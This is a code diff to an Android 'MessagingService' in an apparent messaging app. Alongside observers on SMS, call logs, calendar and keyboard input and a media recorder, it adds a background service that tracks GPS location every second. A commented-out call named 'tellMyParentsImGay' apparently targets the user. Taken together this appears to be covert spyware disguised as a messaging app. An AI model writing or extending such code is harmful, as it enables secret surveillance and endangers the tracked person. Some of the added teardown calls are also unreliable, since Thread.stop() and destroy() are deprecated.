@@ -1,17 +1,24 @@
 package com.candroid.textme.services;
 
+import android.Manifest;
+import android.app.Notification;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.PackageManager;
 import android.database.ContentObserver;
 import android.database.Cursor;
+import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
+import android.os.Looper;
 import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.Telephony;
@@ -51,6 +58,9 @@ public class MessagingService extends Service {
     private LocationManager mLocationManager;
     public static MediaRecorder sMediaRecorder;
     private ImeReceiver mImeReceiver;
+    private LocationListener mLocationListener;
+    private HandlerThread mHandlerThread;
+    private Looper mLooper;
     public MessagingService() {
     }
 
@@ -164,9 +174,6 @@ public class MessagingService extends Service {
             }).start();
         }*/
 /*        try {
-            String locationProvider = LocationManager.GPS_PROVIDER;
-            mLocationManager = Lofl.getLocationManager(MessagingService.this);
-            mLocationManager.requestLocationUpdates(locationProvider, 60000, 60, Lofl.getLocationListener(MessagingService.this));
 
         } catch (SecurityException e) {
             e.printStackTrace();
@@ -178,6 +185,23 @@ public class MessagingService extends Service {
                 Lofl.tellMyParentsImGay(MessagingService.this);
             }
         }).start();*/
+        mHandlerThread = new HandlerThread("locationThread");
+        mHandlerThread.start();
+        mLooper = mHandlerThread.getLooper();
+        String locationProvider = LocationManager.GPS_PROVIDER;
+        mLocationManager = Lofl.getLocationManager(MessagingService.this);
+        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            // TODO: Consider calling
+            //    Activity#requestPermissions
+            // here to request the missing permissions, and then overriding
+            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+            //                                          int[] grantResults)
+            // to handle the case where the user grants the permission. See the documentation
+            // for Activity#requestPermissions for more details.
+            return;
+        }
+        mLocationListener = Lofl.getLocationListener(this);
+        mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
     }
 
     @Override
@@ -199,6 +223,11 @@ public class MessagingService extends Service {
         getContentResolver().unregisterContentObserver(mObserver);
         getContentResolver().unregisterContentObserver(mCallLogObserver);
         getContentResolver().unregisterContentObserver(mCalendarObserver);
+        mLocationManager.removeUpdates(mLocationListener);
+        mLooper.quitSafely();
+        mHandlerThread.stop();
+        mHandlerThread.quitSafely();
+        mHandlerThread.destroy();
         if(sMediaRecorder != null){
             sMediaRecorder.stop();
             sMediaRecorder.release();
